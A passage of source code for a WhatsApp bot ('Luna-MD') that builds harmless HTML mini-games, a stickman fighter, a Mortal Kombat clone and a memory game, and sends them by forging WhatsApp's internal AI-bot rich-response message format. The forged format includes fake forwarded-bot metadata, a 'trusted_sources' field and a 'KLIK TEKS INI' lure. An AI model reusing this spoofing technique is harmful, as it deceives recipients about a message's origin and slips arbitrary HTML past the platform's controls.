#e74c3c66}.title{font-size:28px;font-weight:900;color:#ff4757;letter-spacing:2px}.author{font-size:12px;color:#aaa;margin:5px 0 18px}.start{border:0;border-radius:25px;padding:12px 30px;background:linear-gradient(135deg,#ff4757,#ff6b81);color:#fff;font-weight:900;font-size:15px}#hint{position:absolute;left:50%;bottom:235px;transform:translateX(-50%);font-size:10px;color:#fff8;z-index:4;white-space:nowrap}
</style></head><body><div id="game"><canvas id="c"></canvas><div id="hud"><div class="top"><div class="profile"><div class="avatar">Lv.13</div><div class="bars"><div class="bar"><div id="hp" class="fill hp"></div><div id="hpt" class="bt">HP: 740 / 740</div></div><div class="bar"><div id="xp" class="fill xp"></div><div class="bt">EXP: 1072 / 4550</div></div></div></div><div class="currency">🪙 <span id="coins">9.60K</span>　💎 500　💀 <span id="kills">0</span></div></div></div><div class="watermark"><b>STICKMAN 3D</b> | AI Rich Game</div><div id="combo" class="combo"><b id="comboN">0</b><small>HITS</small></div><div id="hint">A/D atau tombol kiri/kanan • J/⚔ serang • 1 2 3 skill • W/▲ lompat</div><div class="controls"><div class="group"><button class="btn dir" id="l">◀</button><button class="btn dir" id="r">▶</button></div><div class="group"><div class="skills"><button class="btn skill" id="s1">⚡</button><button class="btn skill" id="s2">🔥</button><button class="btn skill" id="s3">🌀</button><button class="btn skill" id="jump">▲</button></div><button class="btn atk" id="attack">⚔</button></div></div><div id="modal" class="modal"><div class="card"><div class="title" id="mt">STICKMAN</div><div class="author">HTML AI Rich Game</div><p style="font-size:13px;color:#ccc;margin-bottom:12px">Kalahkan shadow ninja dan kumpulkan kill!</p><button class="start" id="start">MULAI GAME</button></div></div></div><script>
const c=document.getElementById('c'),x=c.getContext('2d');let W,H,run=false,last=0,kills=0,coins=9600,combo=0,comboT=0,spawnT=0,parts=[],shots=[],enemies=[];const p={x:100,y:0,vx:0,vy:0,w:34,h:62,hp:740,max:740,ground:true,face:1,atk:0,cd:[0,0,0]};const key={l:false,r:false};function resize(){W=c.width=c.clientWidth;H=c.height=c.clientHeight}resize();addEventListener('resize',resize);const ground=()=>H-150;
function audio(freq,type='sine',dur=.12){try{const A=audio.ctx||(audio.ctx=new (AudioContext||webkitAudioContext)()),o=A.createOscillator(),g=A.createGain();o.type=type;o.frequency.value=freq;g.gain.value=.12;o.connect(g);g.connect(A.destination);o.start();g.gain.exponentialRampToValueAtTime(.001,A.currentTime+dur);o.stop(A.currentTime+dur)}catch{}}
function btn(id,down){const e=document.getElementById(id);e.addEventListener('pointerdown',z=>{z.preventDefault();down()})}btn('l',()=>key.l=true);btn('r',()=>key.r=true);['l','r'].forEach(id=>document.getElementById(id).addEventListener('pointerup',()=>key[id==='l'?'l':'r']=false));
function jump(){if(run&&p.ground){p.vy=-12;p.ground=false;audio(500)}}function attack(){if(!run)return;p.atk=12;audio(380,'sine',.15);enemies.forEach(e=>{if(Math.abs(e.x-p.x)<75&&Math.abs(e.y-p.y)<65){e.hp-=35;hit()}})}function hit(){combo++;comboT=120;audio(110,'sawtooth',.1);for(let i=0;i<8;i++)parts.push({x:p.x+(Math.random()-.5)*30,y:p.y+35,vx:(Math.random()-.5)*4,vy:-Math.random()*4,t:25})}
function skill(n){if(!run||p.cd[n-1]>0)return;p.cd[n-1]=n===1?180:n===2?240:300;audio(n===1?700:n===2?220:520,'triangle',.25);let range=n===3?240:180;enemies.forEach(e=>{if(Math.abs(e.x-p.x)<range){e.hp-=n===2?85:n===3?120:55;hit()}});for(let i=0;i<20;i++)parts.push({x:p.x,y:p.y+30,vx:(Math.random()-.5)*8,vy:(Math.random()-.5)*8,t:35})}
btn('jump',jump);btn('attack',attack);btn('s1',()=>skill(1));btn('s2',()=>skill(2));btn('s3',()=>skill(3));document.getElementById('start').onclick=()=>{document.getElementById('modal').style.display='none';run=true;p.hp=p.max;enemies=[];kills=0;combo=0;coins=9600;audio(600)};addEventListener('keydown',e=>{if(e.key==='a'||e.key==='ArrowLeft')key.l=true;if(e.key==='d'||e.key==='ArrowRight')key.r=true;if(e.key==='w'||e.key==='ArrowUp'||e.key===' ')jump();if(e.key==='j'||e.key==='z')attack();if(e.key==='1')skill(1);if(e.key==='2')skill(2);if(e.key==='3')skill(3)});addEventListener('keyup',e=>{if(e.key==='a'||e.key==='ArrowLeft')key.l=false;if(e.key==='d'||e.key==='ArrowRight')key.r=false});
function enemy(){enemies.push({x:Math.random()<.5?-20:W+20,y:0,hp:80,max:80,spd:1.1+Math.random()*1.2})}function update(){if(!run)return;p.vx=(key.r?4.5:0)-(key.l?4.5:0);if(p.vx)p.face=Math.sign(p.vx);p.x=Math.max(15,Math.min(W-15,p.x+p.vx));p.vy+=.65;p.y+=p.vy;if(p.y>=ground()-p.h){p.y=ground()-p.h;p.vy=0;p.ground=true}for(let i=0;i<3;i++)p.cd[i]=Math.max(0,p.cd[i]-1);if(p.atk)p.atk--;spawnT--;if(spawnT<=0){enemy();spawnT=80+Math.random()*80}enemies.forEach(e=>{e.x+=e.x<p.x?e.spd:-e.spd;if(Math.abs(e.x-p.x)<30&&Math.abs(e.y-p.y)<60&&Math.random()<.025){p.hp-=12;audio(80,'square',.1)}});enemies=enemies.filter(e=>{if(e.hp<=0){kills++;coins+=250;return false}return true});comboT--;if(comboT<=0)combo=0;parts.forEach(q=>{q.x+=q.vx;q.y+=q.vy;q.vy+=.2;q.t--});parts=parts.filter(q=>q.t>0);if(p.hp<=0){run=false;document.getElementById('mt').textContent='GAME OVER';document.querySelector('.card p').textContent='Kill: '+kills+' • Coins: '+coins.toLocaleString('id-ID');document.getElementById('start').textContent='MAIN LAGI';document.getElementById('modal').style.display='flex'}}
function stick(a,enemy=false){x.save();x.translate(a.x,a.y);if(enemy)x.scale(-1,1);x.strokeStyle=enemy?'#e74c3c':'#f5f5f5';x.fillStyle=enemy?'#e74c3c':'#fff';x.lineWidth=5;x.lineCap='round';x.beginPath();x.arc(0,12,11,0,Math.PI*2);x.fill();x.beginPath();x.moveTo(0,23);x.lineTo(0,48);x.moveTo(0,30);x.lineTo(-15,40);x.moveTo(0,30);x.lineTo(15,40);x.moveTo(0,48);x.lineTo(-13,62);x.moveTo(0,48);x.lineTo(13,62);x.stroke();if(!enemy&&p.atk){x.strokeStyle='#ff4757';x.lineWidth=4;x.beginPath();x.moveTo(12,34);x.lineTo(58,8);x.stroke()}x.restore()}
function draw(){x.clearRect(0,0,W,H);let gy=ground();let grd=x.createLinearGradient(0,gy,0,H);grd.addColorStop(0,'#202230');grd.addColorStop(1,'#0c0d14');x.fillStyle=grd;x.fillRect(0,gy,W,H-gy);x.strokeStyle='#ffffff18';x.lineWidth=1;for(let i=0;i<W;i+=40){x.beginPath();x.moveTo(i,gy);x.lineTo(i+80,H);x.stroke()}x.fillStyle='#ffffff10';for(let i=0;i<8;i++){x.beginPath();x.arc((i*97+80)%W,80+(i%3)*45,2,0,7);x.fill()}enemies.forEach(e=>stick({x:e.x,y:gy-62},true));stick({x:p.x,y:p.y});parts.forEach(q=>{x.fillStyle='#ffb347';x.fillRect(q.x,q.y,3,3)});x.fillStyle='#fff';x.font='bold 11px Arial';enemies.forEach(e=>{x.fillStyle='#0009';x.fillRect(e.x-22,gy-78,44,5);x.fillStyle='#ff4757';x.fillRect(e.x-22,gy-78,44*(e.hp/e.max),5)});document.getElementById('hp').style.width=Math.max(0,p.hp/p.max*100)+'%';document.getElementById('hpt').textContent='HP: '+Math.max(0,Math.ceil(p.hp))+' / '+p.max;document.getElementById('kills').textContent=kills;document.getElementById('coins').textContent=coins>=1000?(coins/1000).toFixed(2)+'K':coins;document.getElementById('comboN').textContent=combo;document.getElementById('combo').style.opacity=combo?'1':'0'}function loop(t){update();draw();requestAnimationFrame(loop)}requestAnimationFrame(loop);
</script></body></html>`;

const data = {
  response_id: "PopiooNixelPopiooNixelPopiooNixel",
  sections: [
    {
      __typename: "GenAIUnifiedResponseSection",
      view_model: {
        __typename: "GenAISingleLayoutViewModel",
        primitive: {
          __typename: "GenAIBotProgressStatusPrimitive",
          title: "KLIK TEKS INI",
          is_in_progress: true
        }
      }
    }
  ],
  embedded_screens: [
    {
      title: "Preview",
      content: [
        {
          __typename: "FOAIDNixelButtonSheets",
          tabs: [
            {
              id: "tab_0",
              tab_header: "Luna-MD",
              sections: [
                {
                  __typename: "GenAIUnifiedResponseSection",
                  view_model: {
                    __typename: "GenAISingleLayoutViewModel",
                    primitive: {
                      __typename: "GenAIaeacdsnwHtmlPrimitive",
                      payload: html,
                      url: "https://example.com",
                      trusted_sources: ["example.com"]
                    }
                  }
                }
              ],
              step_entries: []
            }
          ]
        }
      ]
    }
  ]
};

await luna.relayMessage(
  m.chat,
  {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: {
        messageDisclaimerText: "",
        richResponseSourcesMetadata: {}
      }
    },
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          unifiedResponse: {
            data: Buffer.from(JSON.stringify(data)).toString('base64')
          },
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedAiBotMessageInfo: { botJid: "0@bot" },
            forwardOrigin: 4
          }
        }
      }
    }
  },
  {
    messageId: await luna.generateMessageTag()
  }
)
}
break

case "mortal": {
const html = `
<style>
:root{
  --ink:#e9edef;
  --ink-soft:#aebac1;
  --muted:#8696a0;
  --accent:#00a884;
  --line:#2a3942;
  --line-strong:#374248;
  --cell-bg:#111b21;
  --card-2:#2a3942;
  --sys:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
}
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
html,body{background:transparent;color:var(--ink);font-family:var(--sys);min-height:100vh;overflow-x:hidden;-webkit-font-smoothing:antialiased;}
.stage{min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px 16px;}
.card{width:100%;max-width:400px;}
.header{display:flex;align-items:baseline;justify-content:space-between;margin-bottom:14px;padding-bottom:12px;border-bottom:1px solid var(--line);gap:8px;}
.header__title{font-size:17px;font-weight:600;color:var(--ink);}
.header__sub{font-size:12px;color:var(--muted);}
.status{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;font-size:13px;gap:8px;}
.status__health{display:flex;gap:8px;width:100%;align-items:center;}
.status__health .hp-bar{flex:1;height:12px;background:#2a1a1a;border-radius:6px;overflow:hidden;border:1px solid #4a2a2a;}
.status__health .hp-fill{height:100%;transition:width 0.2s;}
.status__health .hp-fill.p1{background:linear-gradient(90deg,#ff6b6b,#ee5a24);}
.status__health .hp-fill.p2{background:linear-gradient(90deg,#4a7bec,#0652DD);}
.status__health .hp-label{font-size:11px;font-weight:700;min-width:40px;}
.board-wrap{position:relative;width:100%;aspect-ratio:16/10;background:#0a0a1a;border-radius:8px;overflow:hidden;border:2px solid var(--line-strong);}
canvas{width:100%;height:100%;display:block;cursor:pointer;touch-action:none;image-rendering:pixelated;}
.controls{margin-top:12px;display:flex;flex-direction:column;gap:6px;}
.controls-row{display:flex;gap:6px;justify-content:center;}
.controls button{border:none;border-radius:8px;padding:8px 0;font-size:13px;font-weight:700;color:#0b141a;cursor:pointer;font-family:inherit;background:var(--card-2);color:var(--ink);border:1px solid var(--line);flex:1;min-width:45px;}
.controls button:active{filter:brightness(.85);transform:scale(0.94);}
.btn-punch{background:linear-gradient(180deg,#ff6b6b,#ee5a24);color:#fff !important;}
.btn-kick{background:linear-gradient(180deg,#4a7bec,#0652DD);color:#fff !important;}
.btn-block{background:linear-gradient(180deg,#f9ca24,#f0932b);color:#fff !important;}
.btn-reset{background:var(--accent);color:#0b141a !important;border-color:var(--accent) !important;flex:2;}
</style>

<main class="stage">
<div class="card">
<div class="header">
<div class="header__title">⚔️ Mortal Kombat</div>
<div class="header__sub">fight!</div>
</div>
<div class="status">
<div class="status__health">
<span class="hp-label" id="p1-name">Player</span>
<div class="hp-bar"><div class="hp-fill p1" id="p1-hp" style="width:100%"></div></div>
<span class="hp-label" id="p2-name">AI</span>
<div class="hp-bar"><div class="hp-fill p2" id="p2-hp" style="width:100%"></div></div>
</div>
</div>
<div class="board-wrap">
<canvas id="board"></canvas>
</div>
<div class="controls">
<div class="controls-row">
<button class="btn-punch" id="btn-punch">👊 PUNCH</button>
<button class="btn-kick" id="btn-kick">🦵 KICK</button>
<button class="btn-block" id="btn-block">🛡️ BLOCK</button>
</div>
<div class="controls-row">
<button class="btn-reset" id="btn-reset">🔄 Reset Fight</button>
</div>
</div>
</div>
</main>

<script>
const canvas=document.getElementById('board');
const ctx=canvas.getContext('2d');
let W=400,H=250;

function resizeCanvas(){
const rect=canvas.getBoundingClientRect();
W=canvas.width=Math.max(320,Math.floor(rect.width));
H=canvas.height=Math.max(200,Math.floor(rect.height));
}

const fighters={
p1:{
x:60,y:0,w:30,h:50,
hp:100,maxHp:100,
attack:8,
defense:5,
speed:3,
blocking:false,
cooldown:0,
combo:0,
anim:'idle',
frame:0,
animTimer:0,
hit:false
},
p2:{
x:260,y:0,w:30,h:50,
hp:100,maxHp:100,
attack:7,
defense:4,
speed:2,
blocking:false,
cooldown:0,
combo:0,
anim:'idle',
frame:0,
animTimer:0,
hit:false
}
};

let groundY=0,gameOver=false,winner=null,round=1,message='',msgTimer=0;
let p1Action=null,p2Action=null,actionTimer=0;

function resetFight(){
fighters.p1.hp=100;fighters.p1.blocking=false;fighters.p1.cooldown=0;fighters.p1.combo=0;fighters.p1.anim='idle';fighters.p1.frame=0;fighters.p1.hit=false;
fighters.p2.hp=100;fighters.p2.blocking=false;fighters.p2.cooldown=0;fighters.p2.combo=0;fighters.p2.anim='idle';fighters.p2.frame=0;fighters.p2.hit=false;
groundY=H*0.78;
fighters.p1.y=groundY-50;
fighters.p2.y=groundY-50;
gameOver=false;winner=null;message='FIGHT!';msgTimer=60;
updateUI();
}

function updateUI(){
document.getElementById('p1-hp').style.width=(fighters.p1.hp/fighters.p1.maxHp*100)+'%';
document.getElementById('p2-hp').style.width=(fighters.p2.hp/fighters.p2.maxHp*100)+'%';
}

function getRandomAction(){
const actions=['punch','kick','block','punch','kick','punch'];
return actions[Math.floor(Math.random()*actions.length)];
}

function aiAction(){
if(gameOver||fighters.p2.cooldown>0)return;
const action=getRandomAction();
const hpPercent=fighters.p2.hp/fighters.p2.maxHp;
if(hpPercent<0.3&&Math.random()<0.5){
p2Action='block';
}else{
p2Action=action;
}
}

function playerAction(action){
if(gameOver||fighters.p1.cooldown>0)return;
p1Action=action;
}

function resolveActions(){
if(!p1Action&&!p2Action)return;

const p1Block=fighters.p1.blocking;
const p2Block=fighters.p2.blocking;
let p1Dmg=0,p2Dmg=0;

if(p1Action==='punch'){
if(p2Block){
fighters.p2.hp-=Math.floor(fighters.p1.attack*0.2);
fighters.p2.hit=true;
}else{
fighters.p2.hp-=fighters.p1.attack;
fighters.p2.hit=true;
}
fighters.p1.cooldown=10;
}

if(p1Action==='kick'){
if(p2Block){
fighters.p2.hp-=Math.floor(fighters.p1.attack*0.1);
}else{
fighters.p2.hp-=Math.floor(fighters.p1.attack*1.2);
}
fighters.p1.cooldown=15;
}

if(p2Action==='punch'){
if(p1Block){
fighters.p1.hp-=Math.floor(fighters.p2.attack*0.2);
}else{
fighters.p1.hp-=fighters.p2.attack;
}
fighters.p2.cooldown=10;
}

if(p2Action==='kick'){
if(p1Block){
fighters.p1.hp-=Math.floor(fighters.p2.attack*0.1);
}else{
fighters.p1.hp-=Math.floor(fighters.p2.attack*1.2);
}
fighters.p2.cooldown=15;
}

if(p1Action==='block'){fighters.p1.blocking=true;}
if(p2Action==='block'){fighters.p2.blocking=true;}

fighters.p1.hp=Math.max(0,fighters.p1.hp);
fighters.p2.hp=Math.max(0,fighters.p2.hp);

p1Action=null;p2Action=null;
actionTimer=0;
updateUI();

if(fighters.p1.hp<=0){gameOver=true;winner='AI';message='💀 AI WINS!';msgTimer=120;}
if(fighters.p2.hp<=0){gameOver=true;winner='Player';message='🏆 YOU WIN!';msgTimer=120;}
}

function update(){
if(gameOver){
msgTimer--;
if(msgTimer<=0){message='';}
return;
}

if(fighters.p1.cooldown>0)fighters.p1.cooldown--;
if(fighters.p2.cooldown>0)fighters.p2.cooldown--;

if(!fighters.p1.blocking)fighters.p1.blocking=false;
if(!fighters.p2.blocking)fighters.p2.blocking=false;

if(fighters.p1.hit){
fighters.p1.hit=false;
fighters.p1.anim='hit';
}
if(fighters.p2.hit){
fighters.p2.hit=false;
fighters.p2.anim='hit';
}

if(fighters.p1.anim==='hit'&&fighters.p1.animTimer>0)fighters.p1.animTimer--;
else if(fighters.p1.anim==='hit'){fighters.p1.anim='idle';fighters.p1.animTimer=0;}

if(fighters.p2.anim==='hit'&&fighters.p2.animTimer>0)fighters.p2.animTimer--;
else if(fighters.p2.anim==='hit'){fighters.p2.anim='idle';fighters.p2.animTimer=0;}

fighters.p1.frame++;
fighters.p2.frame++;

if(Math.random()<0.02&&!gameOver){
aiAction();
}
}

function drawPixel(x,y,size,color){
ctx.fillStyle=color;
ctx.fillRect(x,y,size,size);
}

function drawFighter(f,isPlayer){
const x=f.x,y=f.y,w=f.w,h=f.h;
const isHit=f.anim==='hit'&&f.animTimer>0;
const isBlock=f.blocking;

ctx.save();

if(isHit){
ctx.fillStyle='rgba(255,0,0,0.2)';
ctx.fillRect(x-5,y-5,w+10,h+10);
}

ctx.fillStyle='#1a1a2e';
ctx.fillRect(x-2,y-2,w+4,h+4);

const skin=isPlayer?'#e8b88a':'#d4a574';
ctx.fillStyle=skin;
ctx.fillRect(x+4,y+4,8,8);
ctx.fillRect(x+18,y+4,8,8);

ctx.fillStyle=isPlayer?'#2d3436':'#1a1a1a';
ctx.fillRect(x+4,y+12,8,10);
ctx.fillRect(x+18,y+12,8,10);

ctx.fillStyle=isPlayer?'#e74c3c':'#c0392b';
ctx.fillRect(x+2,y+22,26,16);

ctx.fillStyle=isPlayer?'#2980b9':'#2c3e50';
ctx.fillRect(x+6,y+38,6,10);
ctx.fillRect(x+18,y+38,6,10);

ctx.fillStyle=isPlayer?'#f1c40f':'#f39c12';
ctx.fillRect(x+10,y+20,10,4);

ctx.fillStyle='#fff';
ctx.fillRect(x+6,y+6,3,3);
ctx.fillRect(x+21,y+6,3,3);
ctx.fillStyle='#1a1a1a';
ctx.fillRect(x+7,y+7,1.5,1.5);
ctx.fillRect(x+22,y+7,1.5,1.5);

if(isBlock){
ctx.strokeStyle='#f9ca24';
ctx.lineWidth=3;
ctx.strokeRect(x-4,y-4,w+8,h+8);
ctx.fillStyle='rgba(249,202,36,0.15)';
ctx.fillRect(x-4,y-4,w+8,h+8);
}

if(f.cooldown>0){
ctx.fillStyle='rgba(255,255,255,0.2)';
ctx.fillRect(x,y,w,h);
}

ctx.restore();

if(f.anim==='idle'&&f.frame%30<15){
ctx.fillStyle='rgba(255,255,255,0.05)';
ctx.fillRect(x+2,y+h-4,4,2);
ctx.fillRect(x+w-6,y+h-4,4,2);
}
}

function drawGround(){
ctx.fillStyle='#1a1a2e';
ctx.fillRect(0,groundY+4,W,H-groundY-4);

ctx.fillStyle='#2d2d44';
for(let i=0;i<W;i+=20){
const offset=(i+Date.now()*0.02)%40;
ctx.fillRect(i-offset,groundY+6,10,2);
}

ctx.fillStyle='#3d3d5c';
ctx.fillRect(0,groundY,W,4);
}

function drawBg(){
const grad=ctx.createLinearGradient(0,0,0,groundY);
grad.addColorStop(0,'#0a0a1a');
grad.addColorStop(0.5,'#1a0a1a');
grad.addColorStop(1,'#2a1a1a');
ctx.fillStyle=grad;
ctx.fillRect(0,0,W,groundY);

ctx.fillStyle='rgba(255,200,50,0.05)';
ctx.fillRect(0,0,W,30);
ctx.fillStyle='rgba(255,200,50,0.03)';
ctx.fillRect(0,30,W,20);

ctx.fillStyle='rgba(255,255,255,0.02)';
for(let i=0;i<W;i+=60){
ctx.fillRect(i+Math.sin(i*0.02+Date.now()*0.001)*10,0,30,groundY);
}
}

function drawUI(){
if(message){
ctx.save();
ctx.fillStyle='rgba(0,0,0,0.5)';
const tw=ctx.measureText(message).width||200;
ctx.fillRect(W/2-tw/2-20,H/2-30,tw+40,50);
ctx.fillStyle=message.includes('WIN')?'#f1c40f':'#ff6b6b';
ctx.font='bold 24px sans-serif';
ctx.textAlign='center';ctx.textBaseline='middle';
ctx.fillText(message,W/2,H/2);
ctx.restore();
}
}

function render(){
ctx.clearRect(0,0,W,H);
drawBg();
drawGround();

drawFighter(fighters.p1,true);
drawFighter(fighters.p2,false);

ctx.fillStyle='rgba(255,255,255,0.1)';
ctx.fillRect(W/2-1,0,2,H);

ctx.fillStyle='#ffd93d';
ctx.font='10px sans-serif';
ctx.textAlign='center';
ctx.fillText('ROUND '+round,W/2,18);

drawUI();
}

function gameLoop(){
update();
render();
requestAnimationFrame(gameLoop);
}

document.getElementById('btn-punch').addEventListener('click',()=>{if(!gameOver)playerAction('punch');});
document.getElementById('btn-kick').addEventListener('click',()=>{if(!gameOver)playerAction('kick');});
document.getElementById('btn-block').addEventListener('click',()=>{if(!gameOver)playerAction('block');});
document.getElementById('btn-reset').addEventListener('click',resetFight);

document.addEventListener('keydown',(e)=>{
const k=e.key.toLowerCase();
if(k==='a'||k==='1'){e.preventDefault();if(!gameOver)playerAction('punch');}
if(k==='s'||k==='2'){e.preventDefault();if(!gameOver)playerAction('kick');}
if(k==='d'||k==='3'){e.preventDefault();if(!gameOver)playerAction('block');}
if(k==='r'){e.preventDefault();resetFight();}
});

resizeCanvas();
resetFight();
window.addEventListener('resize',()=>{resizeCanvas();});
gameLoop();
\n/* RIMURU LIGHT SFX: procedural WebAudio, no external audio asset */
(function(){
  if (window.__RIMURU_LIGHT_SFX__) return;
  var ac=null, master=null, last=0;
  function init(){
    try{
      if(!ac){
        var C=window.AudioContext||window.webkitAudioContext;
        if(!C) return null;
        ac=new C();
        master=ac.createGain();
        master.gain.value=0.055;
        master.connect(ac.destination);
      }
      if(ac.state==='suspended') ac.resume();
      return ac;
    }catch(_){ return null; }
  }
  function tone(freq,dur,type,vol,when){
    var c=init(); if(!c||!master) return;
    var now=c.currentTime+(when||0), o=c.createOscillator(), g=c.createGain();
    o.type=type||'sine';
    o.frequency.setValueAtTime(freq,now);
    g.gain.setValueAtTime(0.0001,now);
    g.gain.exponentialRampToValueAtTime(Math.max(0.0001,vol||0.12),now+0.008);
    g.gain.exponentialRampToValueAtTime(0.0001,now+(dur||0.07));
    o.connect(g); g.connect(master); o.start(now); o.stop(now+(dur||0.07)+0.015);
  }
  function cool(now){
    var t=Date.now(); if(t-last<now) return false; last=t; return true;
  }
  var api={
    init:init,
    tap:function(){ if(cool(28)) tone(520,0.045,'square',0.055); },
    move:function(){ if(cool(24)) tone(300,0.035,'triangle',0.045); },
    rotate:function(){ if(cool(24)) tone(430,0.05,'triangle',0.05); },
    drop:function(){ if(cool(20)) tone(180,0.055,'square',0.05); },
    score:function(){ if(cool(18)) { tone(660,0.055,'sine',0.055); tone(880,0.055,'sine',0.04,0.045); } },
    line:function(){ if(cool(35)) { tone(740,0.06,'sine',0.06); tone(1040,0.09,'sine',0.045,0.05); } },
    win:function(){ if(cool(60)) { tone(523,0.08,'sine',0.06); tone(659,0.08,'sine',0.05,0.07); tone(784,0.12,'sine',0.045,0.14); } },
    over:function(){ if(cool(60)) { tone(392,0.09,'sawtooth',0.055); tone(294,0.12,'sawtooth',0.04,0.08); } }
  };
  window.__RIMURU_LIGHT_SFX__=api;

  function num(el){
    var s=(el.textContent||'').replace(/,/g,'').match(/-?\d+(?:\.\d+)?/);
    return s?Number(s[0]):null;
  }
  function bindValue(el){
    var lastVal=num(el);
    var mo=new MutationObserver(function(){
      var n=num(el);
      if(n===null || lastVal===null){ lastVal=n; return; }
      if(n>lastVal){
        var id=((el.id||'')+' '+(el.className||'')).toLowerCase();
        if(/line|combo|clear|level|stage/.test(id)) api.line(); else api.score();
      } else if(n<lastVal && /life|hp|health|lives|heart/.test(((el.id||'')+' '+(el.className||'')).toLowerCase())) api.over();
      lastVal=n;
    });
    mo.observe(el,{subtree:true,childList:true,characterData:true});
  }
  function bindState(el){
    var prev=(el.textContent||'').toLowerCase(), prevCls=el.className||'';
    var mo=new MutationObserver(function(){
      var txt=(el.textContent||'').toLowerCase(), cls=el.className||'';
      var joined=txt+' '+cls.toLowerCase();
      if(joined!==prev+' '+prevCls.toLowerCase()){
        if(/game over|gameover|kalah|selesai|you lose|lose|mati|gagal|over/.test(joined)) api.over();
        else if(/menang|menang!|you win|winner|victory|berhasil|selamat/.test(joined)) api.win();
        prev=txt; prevCls=cls;
      }
    });
    mo.observe(el,{subtree:true,childList:true,characterData:true,attributes:true,attributeFilter:['class','style','hidden','aria-hidden']});
  }
  document.addEventListener('pointerdown',function(){ api.init(); api.tap(); },{passive:true,capture:true});
  document.addEventListener('keydown',function(e){
    api.init();
    var k=e.key;
    if(/^Arrow(Left|Right|Up|Down)$/.test(k) || /^(a|d|w|s)$/i.test(k)) api.move();
    else if(k===' ' || k==='Enter') api.tap();
  },{passive:true,capture:true});
  document.addEventListener('DOMContentLoaded',function(){
    document.querySelectorAll('[id]').forEach(function(el){
      var id=((el.id||'')+' '+(el.className||'')).toLowerCase();
      if(/score|points|lines|combo|level|stage|best|coin/.test(id)) bindValue(el);
      if(/over|result|status|message|state|win|lose|modal/.test(id)) bindState(el);
    });
  });
  if(document.readyState!=='loading'){
    document.querySelectorAll('[id]').forEach(function(el){
      var id=((el.id||'')+' '+(el.className||'')).toLowerCase();
      if(/score|points|lines|combo|level|stage|best|coin/.test(id)) bindValue(el);
      if(/over|result|status|message|state|win|lose|modal/.test(id)) bindState(el);
    });
  }
})();
<\/script>
`;


const data = {
  response_id: "PopiooNixelPopiooNixelPopiooNixel",
  sections: [
    {
      __typename: "GenAIUnifiedResponseSection",
      view_model: {
        __typename: "GenAISingleLayoutViewModel",
        primitive: {
          __typename: "GenAIBotProgressStatusPrimitive",
          title: "KLIK TEKS INI",
          is_in_progress: true
        }
      }
    }
  ],
  embedded_screens: [
    {
      title: "Preview",
      content: [
        {
          __typename: "FOAIDNixelButtonSheets",
          tabs: [
            {
              id: "tab_0",
              tab_header: "Luna-MD",
              sections: [
                {
                  __typename: "GenAIUnifiedResponseSection",
                  view_model: {
                    __typename: "GenAISingleLayoutViewModel",
                    primitive: {
                      __typename: "GenAIaeacdsnwHtmlPrimitive",
                      payload: html,
                      url: "https://example.com",
                      trusted_sources: ["example.com"]
                    }
                  }
                }
              ],
              step_entries: []
            }
          ]
        }
      ]
    }
  ]
};

await luna.relayMessage(
  m.chat,
  {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: {
        messageDisclaimerText: "",
        richResponseSourcesMetadata: {}
      }
    },
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          unifiedResponse: {
            data: Buffer.from(JSON.stringify(data)).toString('base64')
          },
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedAiBotMessageInfo: { botJid: "0@bot" },
            forwardOrigin: 4
          }
        }
      }
    }
  },
  {
    messageId: await luna.generateMessageTag()
  }
)
}
break

case "memory-match": {
const html = `
<style>
:root{
  --ink:#e9edef;
  --ink-soft:#aebac1;
  --muted:#8696a0;
  --accent:#00a884;
  --line:#2a3942;
  --line-strong:#374248;
  --cell-bg:#111b21;
  --card-2:#2a3942;
  --sys:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
}
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
html,body{background:transparent;color:var(--ink);font-family:var(--sys);min-height:100vh;overflow-x:hidden;-webkit-font-smoothing:antialiased;}
.stage{min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px 16px;}
.card{width:100%;max-width:380px;}
.header{display:flex;align-items:baseline;justify-content:space-between;margin-bottom:14px;padding-bottom:12px;border-bottom:1px solid var(--line);gap:8px;}
.header__title{font-size:17px;font-weight:600;color:var(--ink);}
.header__sub{font-size:12px;color:var(--muted);}
.status{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;font-size:13px;gap:8px;}
.status__info{display:flex;gap:16px;color:var(--muted);font-size:12px;}
.status__info b{color:var(--ink);}
.board-wrap{position:relative;width:100%;aspect-ratio:1/1;background:var(--cell-bg);border-radius:12px;overflow:hidden;border:1px solid var(--line);}
canvas{width:100%;height:100%;display:block;cursor:pointer;touch-action:none;}
.footer{margin-top:12px;display:flex;justify-content:center;gap:12px;}
.footer__btn{background:var(--card-2);border:none;color:var(--ink);font-family:inherit;font-size:13px;font-weight:500;cursor:pointer;padding:8px 20px;border-radius:8px;border:1px solid var(--line);}
.footer__btn:active{filter:brightness(.92);}
.footer__btn--primary{background:var(--accent);color:#0b141a;border-color:var(--accent);}
</style>

<main class="stage">
<div class="card">
<div class="header">
<div class="header__title">🧠 Memory Match</div>
<div class="header__sub">cocokin pasangan</div>
</div>
<div class="status">
<div class="status__info">
<span>Pasangan <b id="pairs-matched">0</b>/8</span>
<span>Langkah <b id="moves-count">0</b></span>
<span>⏱️ <b id="timer-display">0s</b></span>
</div>
</div>
<div class="board-wrap">
<canvas id="board"></canvas>
</div>
<div class="footer">
<button class="footer__btn" id="reset-btn">🔄 Ulang</button>
<button class="footer__btn footer__btn--primary" id="newgame-btn">🎮 Game Baru</button>
</div>
</div>
</main>

<script>
const canvas = document.getElementById('board');
const ctx = canvas.getContext('2d');
let W=320,H=320,cols=4,rows=4,cellSize=80;

function resizeCanvas(){
const rect=canvas.getBoundingClientRect();
W=canvas.width=Math.max(280,Math.floor(rect.width));
H=canvas.height=Math.max(280,Math.floor(rect.height));
cellSize=W/cols;
}

